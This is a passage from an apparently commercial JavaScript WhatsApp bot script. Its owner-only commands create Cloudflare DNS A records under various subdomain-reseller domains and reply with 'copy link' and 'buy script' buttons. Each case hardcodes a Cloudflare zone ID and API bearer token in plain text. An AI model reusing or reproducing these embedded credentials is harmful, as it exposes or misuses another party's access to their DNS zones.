                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd29': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "347f37a08f49a25bb16f82b43ece372a";
               let apitoken = "FCiMlkNShemGyG_8mv3xI_cXSjOs15bVJqgG2zxm"
               let tld = "market-software.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd30': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "946d5f35d0657cb8bfa442675b37ec42";
               let apitoken = "9IJl3ihBj_McQT6aG0D5MBFQH3YmB1PO7Z34XLr1"
               let tld = "sellerpanel-vvip.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd31': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4a4818365a74cf535d5b6f16dc62481d";
               let apitoken = "8-zhtsEm27FKPsczF3ro2PipM9i1n8k2rzCyOmvj"
               let tld = "ekioffcial.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break     
case  'd32': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "725378afbddffcc9e2c2992ba4232421";
               let apitoken = "MAe0GRPPRxS77oPYXTvImAKNTWit55R63AxuNT1B"
               let tld = "panelku-jasteb.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break  
case  'd33': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "705b7ba658c5f033b91b1b7985f53244";
               let apitoken = "Ucf7fYmbCbDuNDGJ1J3KE8noSS3tgNHRQMxCJZk8"
               let tld = "pannel-pvrt.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd34': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "bc4748bba0b75e8273b04c3dea2dc59c";
               let apitoken = "JKZrkLdzdd7hmT9XVcsXpoVsXmWQ61bQN6r2_oq"
               let tld = "pannelkuu.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break     
case  'd35': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3f5d5b68ea37bf7b8a10a9a96b544622";
               let apitoken = "fTKJuqbdce2A-9oeoqhJ9vLfo-EUnLqCCz9OAmKG"
               let tld = "server-smtp1.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break                                            
case  'd36': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a0206c68c9b356bdf0a96fbb5d61fbdc";
               let apitoken = "8-zhtsEm27FKPsczF3ro2PipM9i1n8k2rzCyOmvj"
               let tld = "my-website.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break 
case  'd37': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "80e208bb5900abc50d4483bdb8590d42";
               let apitoken = "3XpwIR878Fi0IoVyaJl1ggGgyJXuy_pB3g0M8pjz"
               let tld = "smtp1.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
